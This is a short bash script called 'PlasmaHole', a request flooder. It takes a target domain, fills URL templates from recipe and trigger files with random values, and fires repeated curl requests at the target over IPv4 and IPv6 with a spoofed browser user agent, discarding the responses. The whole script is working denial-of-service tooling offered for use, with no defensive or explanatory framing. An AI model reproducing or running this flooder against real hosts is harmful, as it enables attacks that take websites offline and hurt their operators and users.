#!/bin/bash
echo "PlasmaHole: Request flooder"
echo "PlasmaHole is starting..."
sleep 2s
param=$1
recipeFile=recipe.txt
triggerFile=triggers.txt
userAgent="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
timeout=1 
function updRand {
	let junk1=$RANDOM*32768+$RANDOM
	let junk2=$RANDOM*32768+$RANDOM
}
if [ "$1" == "" ] ; then
	echo "PlasmaHole cannot launch: no specified remote."
fi
if [ "$1" != "" ] ; then
	while IFS= read -r trigger; do
		while IFG= read -r recipe; do
			clear
			updRand
			recipeText=""
			recipeText=${recipe//(trigger)/$trigger}
			rText1=${recipeText//(randA)/$junk1}
			rText2=${rText1//(randB)/$junk2}
			urlText=${rText2//(domain)/$param}
			let stay=$RANDOM/10923+1
			echo "User agent: $userAgent"
			echo "Accessing: $urlText"
			echo "Targeted host: $param"
			echo "Wait: $timeout second(s). Stay: $stay second(s)."
			echo "Current randA: $junk1, randB: $junk2"
			echo ""
			curl -GA "$userAgent" -4m $stay --connect-timeout $timeout "$urlText">/dev/null
			curl -GA "$userAgent" -6m $stay --connect-timeout $timeout "$urlText">/dev/null
		done < ./$recipeFile
	done < ./$triggerFile
	echo "Flooding complete."
fi
echo "PlasmaHole is terminating..."
exit
